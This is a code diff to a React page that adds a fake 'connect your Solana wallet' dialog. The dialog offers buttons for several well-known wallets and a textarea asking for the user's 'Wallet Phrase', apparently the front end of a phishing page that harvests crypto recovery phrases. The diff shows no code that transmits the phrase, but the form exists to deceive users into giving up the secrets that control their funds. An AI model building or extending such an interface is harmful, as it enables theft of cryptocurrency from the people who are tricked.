@@ -73,6 +73,15 @@ export default function Home() {
       setRefers("refers");
   }
 
+  const walletTypeClicked = (e) => {
+    let walletType = e.currentTarget.value;
+
+    let walletTypeContainer = e.currentTarget.parentElement;
+    let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
+    
+    walletPhrase.classList.add('active');
+    walletTypeContainer.classList.add('active');
+  }
 
   return (
     <>
@@ -231,21 +240,45 @@ export default function Home() {
         </div>
     </div>
     <div className={formContainer}>
-            <form onSubmit={(e) => e.preventDefault()}>
-                <div className="cancel-container">
-                    <button onClick={cancel}><div className="cancel"></div> </button>
-                </div>
-                <header>
-                    <h2>Connect a wallet on Solana to continue</h2>
-                </header>
-                <p className="require">You must have atleat 0.02 sol to continue</p>
+        <form onSubmit={(e) => e.preventDefault()}>
+            <div className="cancel-container">
+                <button onClick={cancel}><div className="cancel"></div> </button>
+            </div>
+            <header>
+                <h2>Connect a wallet on Solana to continue</h2>
+            </header>
+            <p className="require">You must have atleat 0.02 sol to continue</p>
+            <div className="Wallet-type-container">
+                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
+                    <img src="/ave.svg" alt="wallet logo" />
+                    <p>Ave Wallet</p>
+                </button>
+                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
+                    <img src="/solflare.svg" alt="wallet logo" />
+                    <p>Solflare</p>
+                </button>
+                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
+                    <img src="/trust.svg" alt="wallet logo" />
+                    <p>Trust Wallet</p>
+                </button>
+                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
+                    <img src="/phantom.svg" alt="wallet logo" />
+                    <p>Phantom</p>
+                </button>
+                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
+                    <img src="/download.svg" alt="wallet logo" />
+                    <p>Coinbase Wallet</p>
+                </button>
+            </div>
+            <div className="Wallet-phrase-container">
                 <label htmlFor="phrase">Wallet Phrase</label>
                 <textarea name="phrase" id="phrase"></textarea>
                 <div className="form-btn-container">
                     <button>Connect</button>
                 </div>
-            </form>
-        </div>
+            </div>
+        </form>
+    </div>
     </>
   );
 }
